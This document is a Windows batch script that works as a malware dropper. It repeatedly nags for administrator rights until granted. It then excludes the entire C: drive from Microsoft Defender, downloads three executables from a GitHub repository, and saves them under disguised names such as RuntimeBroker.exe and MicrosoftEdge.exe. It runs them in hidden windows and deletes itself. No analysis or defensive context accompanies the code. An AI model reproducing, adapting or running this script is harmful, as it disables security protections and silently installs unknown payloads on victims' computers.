@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'" >nul 2>&1
    del "%~f0" >nul 2>&1
    exit
)

:loop
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto loop
    )
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'" >nul 2>&1
    del "%~f0" >nul 2>&1
    exit
